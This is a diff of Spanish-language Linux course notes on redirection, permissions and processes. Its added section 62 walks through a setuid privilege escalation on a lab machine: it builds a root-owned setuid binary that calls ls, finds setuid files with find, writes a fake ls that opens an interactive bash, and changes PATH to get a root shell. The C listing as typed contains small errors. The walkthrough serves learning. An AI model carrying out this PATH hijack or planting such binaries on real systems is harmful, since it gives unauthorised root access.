@@ -80,7 +80,7 @@ en /home/lionel
 
 ----------------------------------------
 
-VIDEO 21 
+21. Creación de ficheros y editores de texto
 
 mkdir test -> creo una nueva carpeta en el lugar donde estoy parado
 
@@ -156,7 +156,7 @@ rm -rf piluso -> para forzar el borrado sin importar nada (sirve para archivos y
 
 ----------------------------------------
 
-VIDEO 24 
+24. Búsqueda de ficheros y directorios
 
 find -> comando para buscar archivos en todo el sistema de archivos de linux 
 find /var/log /home/lionel -name auth.log -> busco la ruta completa de un archivo por nombre dentro de las dos rutas definidas de forma recursiva, es decir, dentro de los dos espacios definidos y dentro de los subdirectorios que puedan haber
@@ -355,7 +355,7 @@ aqui tenemos datos que cambian con frecuencia
 
 ----------------------------------------
 
-VIDEO 26
+26. Caso práctico: Análisis forense del fichero swapfile
 
 emacs /etc/passwd -> para leer un fichero con informacion de todos los usuarios del nuestra maquina Linux con el editor instalado emacs
 
@@ -1150,6 +1150,11 @@ lrwxrwxrwx 1 root root 15 mar  3 12:15 /dev/stdin -> /proc/self/fd/0
 *** file descriptor stdout = 1
 *** file descriptor stderr = 2
 
+lionel@lionel-ubuntu:~$ ls -l /dev/stdin; ls -l /dev/stdout; ls -l /dev/stderr 
+lrwxrwxrwx 1 root root 15 mar 16 15:16 /dev/stdin -> /proc/self/fd/0
+lrwxrwxrwx 1 root root 15 mar 16 15:16 /dev/stdout -> /proc/self/fd/1
+lrwxrwxrwx 1 root root 15 mar 16 15:16 /dev/stderr -> /proc/self/fd/2
+
 *** como vemos, la informacion del file descriptor de cada uno de estos ficheros se encuentra en el directorio /proc, que como vimos consiste en un sistema de ficheros virtual que se va a creando con todos los procesos que tenemos arrancados en ese momento
 
 *** entonces probablemente, si queremos saber el file descriptor de cualquier otro archivo que esta abierto en un momento determinado tendremos que ir a buscarlo dentro de "/proc/" + el PID de ese proceso (veremos mas adelante el tema de los PID)  + "/" , y dentro de ese proceso que esta en ejecucion tendra abierto un fichero, y como lo tiene abierto tendra un file descriptor asociado
@@ -1192,7 +1197,7 @@ lrwxrwxrwx 1 root root 15 mar  3 12:15 /dev/stderr -> /proc/self/fd/2
 *** file descriptor stderr = 2
 
 lionel@lionel-ubuntu:~$ ls -l directorio_inexistente 2> error_ls.txt
-*** redirijo el psible error
+*** redirijo el posible error
 *** le estoy indicando que en caso de error, lo que deberia ir al standard error (file descriptor 2), lo redirija a error_ls.txt
 
 lionel@lionel-ubuntu:~$ cat error_ls.txt 
@@ -1218,7 +1223,7 @@ total 0
 -rw-rw-r-- 1 lionel lionel 0 mar  3 20:41 ficheroR.txt
 ls: cannot access 'dir29/': No such file or directory
 
-*** con e operador "2>&1" estoy indicando que, en caso de error, este se redirija al mismo fichero destino previo a dicho operador
+*** con el operador "2>&1" estoy indicando que, en caso de error, este se redirija al mismo fichero destino previo a dicho operador
 *** lo que estamos indicando con este operador es que queremos que redirija el descriptor 2 (el stderr) al file descriptor 1 (stdoutput)
 *** entonces lo que realmente esta pasando es que el stderr se redirije al stdoutput, y el stdoutput lo redirijimos a ls-salida.txt, con lo que el stdoutput como el stderr se redirigen al mismo fichero destino
 
@@ -1232,7 +1237,7 @@ ls -l dir29/ &>> ls-salida.txt
 
 --------------------
 
-VIDEO 42 - /dev/null
+42. /dev/null
 
 lionel@lionel-ubuntu:~$ \ 
 ls -lah /dev/null;\
@@ -1475,7 +1480,7 @@ lionel@lionel-ubuntu:~$ sed -n 55p /var/log/auth.log
 Mar  3 02:46:53 lionel-ubuntu sudo:   lionel : TTY=pts/0 ; PWD=/home/lionel ; USER=root ; COMMAND=/usr/bin/ln /usr/bin/vulnprog vulnprog.hardlink
 *** sed es un editor de flujo utilizado comúnmente para manipular y transformar textos.
 *** -n: esta opción indica a sed que solo debe imprimir las líneas que se le indiquen explícitamente.
-*** 55p: este comando le dice a sed que imprima la línea 55.
+*** 55p: este comando le dice a sed que imprima la línea 55
 
 SOLUCION PROFESOR:
 
@@ -1887,9 +1892,9 @@ lionel@lionel-ubuntu:~$ ls -l ficheroVideo53.txt
 55. Permisos por defecto: umask
 
 - los sistemas linux (como por ejemplo la dsitro ubuntu) crean los ficheros con los siguientes permisos por default vvv 
-rw-rw-rw-
+rw-rw-rw- (666)
 - los sistemas linux (como por ejemplo la dsitro ubuntu) crean los directorios con los siguientes permisos por default vvv 
-rwxrwxrwx
+rwxrwxrwx (777)
 
 lionel@lionel-ubuntu:~$ ls -ld directorioVideo55/; ls -l ficheroVideo55.txt 
 drwxrwxr-x 2 lionel lionel 4096 mar 10 01:13 directorioVideo55/
@@ -1954,6 +1959,8 @@ lionel@lionel-ubuntu:~$ sudo chmod 777 ficheroVideo56.txt
 56.1) permiso especial setuid
 
 - este bit, este permiso especial que podemos ponerle a un fichero (concretamente se van a poner en ejecutables) lo que nos va a permitir es cambiar el uid del usuario efectivo (y consideramos usuario efectivo el que este ejecutando ese binario, el que este ejecutando ese fichero) por el uid del usuario propietario
+
+- es decir, si un fichero ejecutable tiene permiso setuid (4xxx), cualquier usuario del sistema va a poder ejecutar ese ejecutable, y en el momento en el que lo ejecute va a convertir su uid en el uid del usuario propietario, y por ende, la ejecucion se hara con los privilegios y en nombre del dueño del ejecutable.
 
 - el valor binario del setuid es 100, es decir, 4 en octal
 
@@ -2746,5 +2753,382 @@ drwxrwxr-x 2 testuser root 4096 mar 13 01:28 dirVideo61/
 --------------------
 
 62. Caso Práctico: Explotando el bit setuid
+
+62.1) creo el ejecutable al que voy a añadirle el bit setuid vvv
+
+lionel@lionel-ubuntu:~$ pico ficheroSetuidOwnerLionel.c
+#include <stdio.h>
+#include <sdtlib.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+int main()
+{
+   setuid(0);
+   system("ls /home/lionel")
+   return 0;
+}
+lionel@lionel-ubuntu:~$ ls -l ficheroSetuidOwnerLionel.c 
+-rw-rw-r-- 1 lionel lionel 154 mar 14 08:00 ficheroSetuidOwnerLionel.c
+*** Creamos un ejecutable en C, en el WD de lionel
+
+*** Por qué extension .c? 
+Porque este fichero va a contener un programa escrito en el lenguaje de programacion de alto nivel C 
+
+*** Porque en C y no en shell script? 
+Cuando añadimos el bit setuid sobre un binario, sobre un ejecutable, lo que va a ser el resultado de compilar este programa fichero.c
+Cuando ejecutemos ese binario, por ejemplo, con el usuario lionel, si ese binario tiene como propietario a root, esa ejecucion se hara en nombre de root 
+Sin embargo, cuando añadimos el setuid a un shell script la cosa cambia, y a pesar de que el usuario propietario de ese shell script sea root, si yo ejecuto ese shell script con el usuario lionel, esa ejecucion se hara en nombre de lionel y no de root
+Es decir, el bit setuid no funciona de la manera que hemos visto cuando hablamos de shell scripts
+Esta es una medida de seguridad que ha incorporado el SO linux para evitar que se puedan realizar acciones como vamos a realizar en este caso practico
+
+
+62.2) Lo siguiente que vamos a hacer es compilar este fichero para transformallo en un ejecutable vvv  
+para esto nos convertimos en root, porque este fichero.c es propiedad de lionel, y en este caso nos interesa que el resultado de compilar este fichero.c (generar un ejecutable), sea propiedad de root, para despues añadirle el setuid y luego ejecutarlo con cualquier otro usuario en nombre de root  vvv
+
+lionel@lionel-ubuntu:~$ sudo su
+[sudo] password for lionel: [1234]
+root@lionel-ubuntu:/home/lionel# 
+
+62.3) vamos a utilizar la suite de gcc que incluye el compilador de C que viene por defecto en linux para compilar este programita vvv
+*** Una "suite" se refiere a un conjunto o colección de herramientas, programas o aplicaciones relacionadas que se ofrecen como un paquete integrado. (ChatGTP)
+*** En el contexto de GCC (GNU Compiler Collection), se puede considerar como una "suite" porque no se trata solo de un compilador individual, sino de un conjunto de compiladores y herramientas relacionadas con la compilación que están diseñadas para funcionar juntas para proporcionar un entorno de desarrollo completo para varios lenguajes de programación. (ChatGTP)
+
+root@lionel-ubuntu:/home/lionel# gcc ficheroSetuidOwnerLionel.c -o ficheroSetuidOwnerLionelEjecutable
+Command 'gcc' not found, but can be installed with:
+apt install gcc
+*** verifico que no tendgo instalado gcc
+
+root@lionel-ubuntu:/home/lionel# sudo apt install gcc
+Reading package lists... Done
+Building dependency tree... Done
+...
+*** instalo gcc
+
+root@lionel-ubuntu:/home/lionel# gcc ficheroSetuidOwnerLionel.c -o ficheroSetuidOwnerLionelEjecutable
+*** con -o podemos ejecutar el fichero resultante, el ejecutable resultante 
+*** con este comando convertimos el fichero ficheroSetuidOwnerLionel.c en el ejecutable ficheroSetuidOwnerLionelEjecutable
+
+root@lionel-ubuntu:/home/lionel# ls -la ficheroSetuidOwnerLionel.c; ls -la ficheroSetuidOwnerLionelEjecutable 
+-rw-rw-r-- 1 lionel lionel 155 mar 14 20:21 ficheroSetuidOwnerLionel.c
+-rwxr-xr-x 1 root root 16024 mar 14 20:21 ficheroSetuidOwnerLionelEjecutable
+*** verifico que conservo el fichero de extension .c de lionel y se ha creado un ejecutable a partir de este propiedad de root 
+*** recordar que a pesar de tener el bit setuid si nosotros queremos ejecutar un binario en nombre de otro usaurio tenemos que tener tambien permisos de ejecucion setuid vvv
+
+root@lionel-ubuntu:/home/lionel# chmod u+s ficheroSetuidOwnerLionelEjecutable 
+*** con root, le damos permisos setuid al ejecutable (notacion explicada en VIDEO 56, linea 2029 aprox )
+
+root@lionel-ubuntu:/home/lionel# ls -la ficheroSetuidOwnerLionelEjecutable 
+-rwsr-xr-x 1 root root 16024 mar 14 20:21 ficheroSetuidOwnerLionelEjecutable
+*** compruebo que el bit setuid se aplico correctamente para el ejecutable
+
+root@lionel-ubuntu:/home/lionel# mv ficheroSetuidOwnerLionelEjecutable /usr/bin/
+*** para que este binario encaje con la ruta en la que se encuentran los binarios del sistema movemos el ejecutabe a /usr/bin
+
+root@lionel-ubuntu:/home/lionel# ls -la /usr/bin/ficheroSetuidOwnerLionelEjecutable 
+-rwsr-xr-x 1 root root 16024 mar 14 20:21 /usr/bin/ficheroSetuidOwnerLionelEjecutable
+*** verifico que se movio correctamente
+
+
+lionel@lionel-ubuntu:~$ ficheroSetuidOwnerLionelEjecutable
+...
+*** ejecuto el ececutable correctamente
+*** podemos ejecutarlo sin indicar la ruta absoluta (/usr/bin/...) porque por default, cuando introducimos un comando en la terminal sin pasarle ruta absoluta, la shell revisa en todas las rutas de la variable de entorno PATH si lo ingresado se corresponde con algun ejecutable y, como movimos este ejecutable a /usr/bin, lo encuentra y ejecuta su contenido (el codigo fuente que escribimos en C)
+*** entonces "ficheroSetuidOwnerLionelEjecutable" es un ejecutable al igual que "cd", "cat", "ls", "head", etc., y siempre la shell va a buscar a estos comandos a las rutas definidas en PATH
+
+lionel@lionel-ubuntu:~$ env
+*** lista por pantalla todas las variables de entorno del SO
+
+lionel@lionel-ubuntu:~$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+*** imprimo el contenido de la variable de entorno PATH
+*** entre estas rutas enconctraremos los comandos o ejecutables del sistema
+
+lionel@lionel-ubuntu:~$ ls -la /usr/bin/ls; ls -la /usr/bin/ficheroSetuidOwnerLionelEjecutable 
+-rwxr-xr-x 1 root root 138208 feb  7  2022 /usr/bin/ls
+-rwsr-xr-x 1 root root 16024 mar 14 20:21 /usr/bin/ficheroSetuidOwnerLionelEjecutable
+
+-------------------------------------------
+
+- probablemente un atacante lo primero que haria cuando entre a una maquina linux y quiera explotar este tipo de problemas de seguridad seria buscar todos los ejecutables que hay en el sistema o todos los ficheros que tienen el bit setuid vvv
+
+find / -type f -perm -4001 2> /dev/null
+...
+/usr/bin/mount
+/usr/bin/ficheroSetuidOwnerLionelEjecutable
+/usr/bin/gpasswd
+...
+*** /            || desde la raiz 
+*** -type f      || para cualquier fichero 
+*** -perm -4001  || para buscar por permisos (en este caso con el bit setuid y permisos de ejecucion para el mundo)
+*** 2> /dev/null || redirijo los errores (/dev/stderr) a /dev/null para que no se listen por pantalla (/dev/null es un fichero especial, un CARACTER DEVICE FILE (una "c" en lugar de "-"), utilizado para estos casos (VIDEO 42))
+*** 2            || hace referencia a /proc/self/fd/2 (recordar que los errores son enviados a /dev/stderr, y que este es un soft link a /proc/self/fd/2)
+*** >            || es un operador de redireccion 
+
+- el comando anterior nos lista todos los ficheros de nuestro SO linux con el bit setuid activado
+- como vemos, listo el ejecutable que generamos con root (/usr/bin/ficheroSetuidOwnerLionelEjecutable)
+- el atacante, va a identificar que no es un ejecutable propio del sistema, y es el primero que se va a poner a mirar vvv
+
+lionel@lionel-ubuntu:~$ cat /usr/bin/ficheroSetuidOwnerLionelEjecutable 
+@@@@�``��   ���-�=�=`h�-�=�=�8880hhhDDS�td8880P�td   44Q�tdR�td�-�=�=PP/lib64/ld-linux-x86-64.so.2 GNU���GNU�)H�d��Ӡ��,Ղ��G�ՙGNU��e�mQ "m | )"__cxa_finalize__libc_start_mainsystemsetuidlibc.so.6GLIBC_2.2.5GLIBC_2.34_ITM_deregisterTMCloneTable__gmon_start___ITM_registerTMCloneTable0u�i	:���F�`@�?�?�?�?�?�?�?��H�H��/H��t��H���5�/��%�/��h���������h�����������%�/D����%]/D����%U/D��1�I��^H��H���PTE1�1�H�=��3/�f.�H�=Y/H�R/H9�tH�/H��t	�����H�=)/H�5"/H)�H��H��?H��H�H��tH��.H����fD�����=�.u+UH�=�.H��t
+... 
+*** como vemos, el contenido de un ejecutable (un binario), no es legible, y por ejemplo cat o pico, no le serviria al atacante 
+*** esto ya no es codigo, no es shell script, esto es un ejecutable, un binario 
+
+-------------------------------------------
+
+¿Como saber que esta haciendo un binario?
+
+- con el comando strings (viene instalado por defecto)
+- este comando aplicado a un binario, va a listar por terminal todas las cadenas de texto que tiene el ejecutable 
+- estas cadenas de texto pueden referenciar cualquier cosa 
+- si indagamos, encontramos la cadena de texto "ls /home/lionel", que es concretamente la funcionalidad que tiene nuestro binario vvv
+
+lionel@lionel-ubuntu:~$ strings /usr/bin/ficheroSetuidOwnerLionelEjecutable 
+... 
+u+UH
+ls /home/lionel
+:*3$"
+...
+*** 
+
+-------------------------------------------
+
+- ahora mismo con lionel o testuser, puedo ejectutar este binario (propiedad de root) porque el mundo tiene permisos de ejecucion 
+- ademas, como este binario tiene el bit setuid activado, cualquier usuario que lo ejecute, lo esta haciendo en nombre de root, con privilegios elevados
+
+- entonces la ejecucion de este binario ejecuta ls /home/lionel, entonces la shell busca en PATH y encuentra el ejecutable ls en /usr/bin, y al encontrarlo, finalmente lo ejecuta 
+
+- aca lo que sucede es que esta variable de entorno PATH la podemosm modificar sin permisos elevados 
+- esto quiere decir que en PATH cualquier usuario puede añadir otras rutas en las que la shell buscase un binario ls o cualquier otro ejecutable cuando alguien este queriendo ejecutar ese comando 
+
+- y yo (lionel) puedo crearme mi propio ejecutable ls (por ejemplo dentro de mi home) que haga otra cosa distinta que lo que hace el ls default (y que se encuentra en el ejecutable de root con el bit setuid activado, que implica que cualquier usuario que ejecute el binario lo estara haciendo en nombre de root)
+
+- y eso es loque vamos a hacer: creo un fichero ls dentro de mi WD vvv 
+
+lionel@lionel-ubuntu:~$ pico "ls"
+#!/bin/bash 
+
+/bin/bash -i
+lionel@lionel-ubuntu:~$
+*** esto APRANTEMENTE tiene que ver con shell scripting (en el ejercicio del VIDEO 37 hay un primer ejemplo que parece ser el mismo lenguaje) 
+
+lionel@lionel-ubuntu:~$ cat ls
+#!/bin/bash 
+
+/bin/bash -i
+
+- mi comando ls lo que hace es que saca una consola interactiva
+- es decir, ejecuta "/bin/bash" (la shell bash) y nos la devuelve para que nosotros podamos interactuar
+
+- ¿que va a ocurrir aca?
+
+lionel@lionel-ubuntu:~$ ls -la ls
+-rw-rw-r-- 1 lionel lionel 27 mar 16 19:22 ls
+*** los permisos del profesor son rwxr-xr-x (755), los mios 664. Intente configurar mis permisos por default en 775 con umask pero aparentemente no me deja modificar permisos de ejecucion (deje pregunta en VIDEO 55)
+
+lionel@lionel-ubuntu:~$ chmod 755 ls
+lionel@lionel-ubuntu:~$ ls -la ls
+-rwxr-xr-x 1 lionel lionel 27 mar 16 19:22 ls
+*** le cambie los permisos y ahora si tengo permisos de ejecucion para usuario, grupo y mundo
+
+- agrego al inicio de la cadena de la variable de entorno PATH la ruta /home/lionel vvv
+
+lionel@lionel-ubuntu:~$ export PATH=/home/lionel:$PATH
+lionel@lionel-ubuntu:~$ echo $PATH
+/home/lionel:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/snap/bin
+*** esto lo puedo hacer con lionel porque para editar una variable de entorno no necesito privilegios de administracion
+
+lionel@lionel-ubuntu:~$ ficheroSetuidOwnerLionelEjecutable
+
+CONCLUSION:
+- ejecuto el binario ficheroSetuidOwnerLionelEjecutable (en /usr/bin, propiedad de root, con permisos de ejecucion para todo mundo y con el bit setuid - cualquier usuario que ejecute este binario lo hara en nombre de root)
+- este binario ejecuta "ls /home/lionel", que muestra el contenido del WD de lionel 
+
+- ahore bien, el atacante accedió a la cuenta de dummyuser y descubrio esta vulnerabilidad en el binario propiedad de root (que puede crear un unevo comando ls con otros fines)
+- entonces crea un ejecutable ls en /home/dummyuser que devuelve una shell de bash  
+- luego modifica la variable de entorno PATH y agrega al inicio la ruta al WD de dummyuser 
+- ahora cuando el atacante ejecute el ficheroSetuidOwnerLionelEjecutable (el ejecutable de root, con plenos permisos de ejecucion y bit setui), se va a ejecutar el comando ls, entonces la shell va a buscar en PATH la ubicacion de este comando, y la va a encontrar en la primera ruta de la variable de entorno (/home/userdummy) (modificacion del atacante) por lo que se ejecutara el ls de /home/userdummy y no el de /usr/bin
+- con esto el atacante ha accedido al sistema como root con plenos privilegios pra hacer lo que quiera
+
+--------------------
+
+64. Procesos en Linux 
+
+- linux, como practicamente cualquier SO moderno, es un sistema multitarea 
+- esto quiere decir que nos va a provocar la ilusion de que podemos estar ejecutando diferentes programas al mismo tiempo y realizando diferentes tareas a la vez
+- sin embargo, estos programas van a requerir el consumo de diferentes recursos de nuestro equipo (por ejemplo la CPU) y este consumo no se va a hacer de manera simultanea, sino que lo va a ir gestionando el kernel de nuestro SO y lo va a ir asignando de manera secuencial a los diferenctes programas que se encuentren en ejecucion 
+- a nosotros nos parece que todos los programas que tenemos en uso (por ejemplo Firefox, la terminal, Postman) se estan ejecutando al mismo tiempo porque el kernel hace el cambio de asignacion de recursos tan rapido (en cuestion de milisegundos) que a nosotros no nos da tiempo a percibirlo y nos da la impresion de que todo se esta ejecutando al mismo tiempo (pero realmente no, esta habiendo este cambio de recursos)
+
+notas de holaMundo vvv
+- Cada SO cuenta con 3 partes:
+- 1era capa (o capa inferior) -> Hardware fisico de la computadora (tarjeta de red, procesador, memoria RAM, etc.)
+- 2da capa -> Kernel
+    -> es el encargado de comunicar el Hardware Fisico con las Aplicaciones
+    -> se va a encargar de asignarle los recursos necesarios a las Aplicaciones (por ej., si una app corriendo (proceso) necesita x cantidad de RAM, el Kernel se la asignara)
+- 3ra capa -> Aplicaciones
+
+PROGRAMA
+- un programa va a ser generalmente un ejecutable, una pieza de codigo fuente, un binario, que se encuentra almacenado en el disco duro de nuestro ordenador y que no tiene por que estar en ejecucion
+
+PROCESO 
+- en el momento en que yo ejecuto un programa (por ejemplo ls, cat, emacs, etc) pasas a ser un proceso
+- es decir, un proceso va a ser una instancia activa, en ejecucion, de un programa
+
+- ¿Para que sirven los procesos?
+- son las estructuras que utiliza el kernel para ir gestionando todo lo uque hablamos anteriormente (la asignacion de recursos, organizar la actividad que estan realizando, los ficheros que estan abriendo, etc)
+
+CONCLUSION: un programa es cualquier archivo ejecutable que tenemos dentro del disco duro de nuestro equipo, y en el momento en el que lo ejecutamos se va a generar un proceso que va a comenzar a gestionar el kernel de nuestro SO
+
+--------------------
+
+- el kernel va a mantener diferente informacion sobre los procesos 
+- va a mantener por ejemplo un registro de la memoria que esta asignada al proceso
+- los archivos que tiene abiertos 
+- el ejecutable a partir del cual se ejecuto ese proceso 
+- un monton de informacion que se va a encontrar en /proc 
+- concretamente cada uno de los procesos que nosostros generamos en linux van a tener tambien un identificador que se va a denominar PID (process id)
+
+lionel@lionel-ubuntu:~$ ls /proc/
+1     1585  1731  1868  200   249  496   6225  76    8215   buddyinfo      meminfo
+1025  159   1737  187   201   250  497   6226  765   8216   bus            misc
+...
+*** estos directorios con numeros hacen referencia al PID de los diferentes procesos que se encuentran en ejecucion en este momento 
+*** estas carpetas se crean dinamicamente cuando nosotros creamos un proceso y se eliminan cuando nosotros cerramos el proceso
+
+--------------------
+
+Ejemplo practico vvv
+
+lionel@lionel-ubuntu:~$ emacs
+*** (en una nueva ventana, se abrio el editor de texto emacs)
+*** en este punto, he tomado el ejecutable de emacs, lo he ejecutado y he generado un proceso que es lo que estais viendo ahora mismo en ejecucion (referencia a la nueva ventana con el editor abierto)
+
+lionel@lionel-ubuntu:~$ 
+*** abro una nueva terminal (Ctrl + Alt + T) porque la otra la tenemos ocupada ejecutando este ejecutable, este binario (emacs)
+
+lionel@lionel-ubuntu:~$ cd /proc/
+lionel@lionel-ubuntu:/proc$ ls
+1     1593  176   1896  2052  33   583   685   808   8638
+... 
+*** entre estos directorios numerados, se encuentra el correspondiente al proceso que esta ejecutando emacs 
+
+lionel@lionel-ubuntu:/proc$ pidof emacs 
+8629
+*** la utilidad pidof nos permite conocer el id de cualquier programa que se encuentra en ejecucion (man pidof)
+
+lionel@lionel-ubuntu:/proc$ cd 8629 
+lionel@lionel-ubuntu:/proc/8629$ 
+lionel@lionel-ubuntu:/proc/8629$ ls
+arch_status         cpuset             limits      numa_maps      schedstat     task
+attr                cwd                loginuid    oom_adj        sessionid     timens_offsets
+cmdline 
+... 
+*** aqui esta toda la informacion que esta gestionando el kernel, asociada a este proceso que tenemos en ejecucion (emacs) 
+
+lionel@lionel-ubuntu:/proc/8629$ cat cmdline 
+emacslionel@lionel-ubuntu:/proc/8629$ 
+*** por ejemplo, cmdline, nos devuelve el comando que se utilizo para ejecutar este proceso 
+
+lionel@lionel-ubuntu:/proc$ cd 8629
+bash: cd: 8629: No such file or directory
+*** cerré la ventana del editor emacs, por lo tanto cerré el proceso, ese proceso ya no existe porque ese programa ya no esta en ejecucion 
+*** trato de ingresar nuevamente al directorio asociado al proceso que esta ejecutando emacs y compruebo que este ya no existe
+
+--------------------
+
+65. Visualización estática de procesos
+
+COMANDO ps:
+- ps - report a snapshot of the current processes. (man ps)
+- ps va a reportanrnos un snapshot de los procesos que se estan ejecutando en un momento determinado ()
+- ps nos va a sacar una imagen de los procesos que se encuentran en ejecucion, que se encuentran dormidos, que se encuentran en general activos dentro de nuestro SO pero en el momento en el que yo he ejecutado ese comando, es decir, no va a ser una salida en tiempo real
+
+lionel@lionel-ubuntu:~$ ps
+    PID TTY          TIME CMD
+   8912 pts/0    00:00:00 bash
+   8918 pts/0    00:00:00 ps
+*** como vemos, se listan solo 2 procesos (el 8912 que es la terminal en la que estamos escribiendo (bash), y el 8918 que es el que se ha generado como consecuencia de la ejecucion del comando ps) 
+*** estos no son los dos unicos comandos en ejecucion, ya que si asi fuera, no estariamos viendo la interfaz grafica de ubunto, la barra de tareas, etc 
+*** lo que ocurre es que ps por defecto va a listar unicamente los procesos asociados a la terminal en la que estamos escribiendo 
+*** PID = identificador de cada proceso
+*** TTY = Tele Type Writer || esta relacionado con la terminal en la que se esta ejecutando ese proceso || pts/0 hace referencia a la terminal en la que estamos escribiendo
+*** TIME = tiene que ver con el consumo de tiempo de CPU que estan haciendo estos procesos (ninguno de los dos esta consumiendo practicamente nada de CPU, y es porque ambos son procesos muy ligeros, procesos que no requieren mucho consumo de recursos)
+*** CMD = es el comanando que ha generado ese proceso
+
+lionel@lionel-ubuntu:~$ ps x
+    PID TTY      STAT   TIME COMMAND
+   1529 ?        Ss     0:01 /lib/systemd/systemd --user
+... 
+*** lista todos los procesos que tenemos ejecutandose en el sistema y ademas nos añade la columna estado (STAT)
+
+lionel@lionel-ubuntu:~$ emacs
+*** en una segunda terminal ejecuto el proceso emacs 
+
+- en la terminal anterior no vamos a ver en el listao la entrada asociada al proceso emacs ya que se trata de una imagen en el momento en que yo ejecuté ps x 
+- vuelvo a ejecutar ps x en la consola anterior vvv
+
+lionel@lionel-ubuntu:~$ ps x
+    PID TTY      STAT   TIME COMMAND
+...
+   9167 pts/1    Sl+    0:00 emacs
+   9202 pts/0    R+     0:00 ps x
+lionel@lionel-ubuntu:~$ 
+*** en esta nueva imagen que nos devuelve ps x vemos que aparece emacs como uno de los procesos que se encuentra activo 
+*** observamos que el TTY del proceso emacs cambia porque emacs lo ejecutamos en una terminal distinta (pts/1) de la terminal donde ejecutamos ps x (pts/0)
+*** STAT = todas las letras que forman parte del STAT de un proceso tienen un significado especial para ps y estan relacionadas con el estado en el que se encuentra cada proceso vvv 
+
+lionel@lionel-ubuntu:~$ man ps
+...
+PROCESS STATE CODES
+       Here are the different values that the s, stat and state output specifiers (header "STAT"
+       or "S") will display to describe the state of a process:
+
+               D    uninterruptible sleep (usually IO)
+               I    Idle kernel thread
+               R    running or runnable (on run queue)
+               S    interruptible sleep (waiting for an event to complete)
+               T    stopped by job control signal
+               t    stopped by debugger during the tracing
+               W    paging (not valid since the 2.6.xx kernel)
+               X    dead (should never be seen)
+               Z    defunct ("zombie") process, terminated but not reaped by its parent
+
+       For BSD formats and when the stat keyword is used, additional characters may be displayed:
+
+               <    high-priority (not nice to other users)
+               N    low-priority (nice to other users)
+               L    has pages locked into memory (for real-time and custom IO)
+               s    is a session leader
+               l    is multi-threaded (using CLONE_THREAD, like NPTL pthreads do)
+               +    is in the foreground process group
+*** aqui tenemos todos los codigos de todas las letras que pueden aparecer en el estado (STAT)
+*** el profesor explica verbalmente en detalle alguno de estoso significados (min 5'50" aprox)
+
+lionel@lionel-ubuntu:~$ ps aux
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root           1  0.0  0.3 166764 11900 ?        Ss   mar16   0:03 /sbin/init auto noprompt splash
+... 
+*** USER = usuario que ha ejecutado el proceso
+*** %CPU = consumo de CPU del proceso en ese momento 
+*** %MEM = consumo de memoria RAM del proceso en ese momento
+*** VSZ = consumo de memoria virtual del proceso en ese momento   
+*** RSS =
+*** START = el comienzo de ejecucion de ese proceso
+*** TIME = tiene que ver con el consumo de tiempo de CPU que estan haciendo estos procesos 
+*** COMMAND = el comando que se utilizo para ejecutar el proceso
+
+lionel@lionel-ubuntu:~$ ps aux | less 
+...
+*** podemos hacer un pipe a less para visualizar la lista de modo interactivo
+
+lionel@lionel-ubuntu:~$ ps aux | tail -n 1
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+lionel      9293  0.0  0.0  10940  2304 pts/0    S+   15:35   0:00 tail -n 1
+*** START = se trata de la hora en la que he ejecutado el comando (ahora mismo, Domingo 17 de Marzo de 2024 15:35 hs.)
+
+--------------------
+
+66. Visualización dinámica de procesos
 
 ...
